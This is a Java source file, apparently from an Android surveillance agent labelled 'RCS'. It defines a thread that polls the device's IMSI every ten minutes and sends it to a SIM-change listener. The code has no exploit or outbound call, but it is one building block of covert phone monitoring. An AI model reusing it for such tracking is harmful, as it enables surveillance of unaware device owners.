/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : BroadcastMonitorSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.listener;

import com.android.dvci.Device;
import com.android.dvci.Sim;
import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;

public class BroadcastMonitorSim extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorSim"; //$NON-NLS-1$

	private boolean stop;
	private final int period;

	public BroadcastMonitorSim() {
		stop = false;
		period = 10 * 60 * 1000; // Poll interval, 10 minutes
		if (Cfg.DEBUG) {
			setName(getClass().getSimpleName());
		}
	}

	@Override
	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			final String imsi = Device.self().getImsi();
			onReceive(imsi);

			try {
				wait(period);
			} catch (final InterruptedException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(e);//$NON-NLS-1$
				}
			}
		} while (true);
	}

	public void onReceive(String imsi) {
		ListenerSim.self().dispatch(new Sim(imsi));
	}

	void register() {
		stop = false;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
